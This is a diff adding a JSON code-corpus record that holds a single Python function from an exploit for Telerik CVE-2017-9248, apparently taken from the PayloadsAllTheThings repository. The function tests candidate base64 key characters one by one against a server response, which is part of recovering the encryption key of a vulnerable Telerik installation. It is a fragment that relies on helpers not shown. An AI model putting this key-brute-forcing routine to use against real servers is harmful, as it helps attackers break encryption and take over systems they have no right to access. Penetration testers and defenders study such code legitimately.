@@ -1,0 +1,7 @@
+{
+    "code": "def test_keychar(keychar, found, session, pad_chars):\n    base64chars = [\n                    \"A\", \"Q\", \"g\", \"w\", \"B\", \"R\", \"h\", \"x\", \"C\", \"S\", \"i\", \"y\",\n                    \"D\", \"T\", \"j\", \"z\", \"E\", \"U\", \"k\", \"0\", \"F\", \"V\", \"l\", \"1\",\n                    \"G\", \"W\", \"m\", \"2\", \"H\", \"X\", \"n\", \"3\", \"I\", \"Y\", \"o\", \"4\",\n                    \"J\", \"Z\", \"p\", \"5\", \"K\", \"a\", \"q\", \"6\", \"L\", \"b\", \"r\", \"7\",\n                    \"M\", \"c\", \"s\", \"8\", \"N\", \"d\", \"t\", \"9\", \"O\", \"e\", \"u\", \"+\",\n                    \"P\", \"f\", \"v\", \"/\"\n                  ]\n\n    duff = False\n    accuracy_thoroughness_threshold = args.accuracy\n    for bc in range(int(accuracy_thoroughness_threshold)):\n                                                # ^^ max is len(base64chars)\n        sys.stdout.write(\"\\b\\b\" + base64chars[bc] + \"]\")\n        sys.stdout.flush()\n        if not get_result(\n                      base64chars[0] * len(found) + base64chars[bc],\n                      found + keychar, session, pad_chars\n                      ):\n            duff = True\n            break\n    return False if duff else True",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Telerik CVE-2017-9248.py",
+    "license": "MIT",
+    "language": "python"
+}
